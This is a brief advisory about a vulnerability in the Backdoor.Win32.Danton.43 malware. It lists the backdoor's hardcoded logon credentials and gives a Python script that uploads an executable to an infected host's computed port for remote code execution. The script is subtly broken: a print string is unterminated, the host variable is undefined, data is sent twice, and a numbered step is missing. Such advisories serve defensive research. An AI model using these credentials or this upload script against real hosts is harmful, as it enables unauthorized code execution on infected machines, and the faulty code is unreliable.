Threat: Backdoor.Win32.Danton.43
Vulnerability: Weak Hardcoded Credentials RCE
Description: The malware listens on TCP port 6974 and stores several pairs
of weak hardcoded credentials in plaintext within the executable. First
username / password combination is stored as TDanton, TDanton by removing
the "T" we get valid creds of Danton, Danton to logon. Other credential
pairs are Danton2 Danton2, Danton3 Danton, Danton4 Danton. They can be
found by running strings util against the malware executable. Attackers may
then upload executables using ftp PASV, STOR commands, this can result in
remote code execution.

2) Calculate port and run upload script.

from socket import *

#Calculate port 64*256 + 1 = 16385
PORT=16385
DOOM="DOOM.exe"

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()

    print("Backdoor.Win32.Danton.43 / Weak Hardcoded Credentials RCE)
    print("MD5: 85f7ef2b6b8da9adb7723a13b91ac1c7")
    print("By Malvuln");
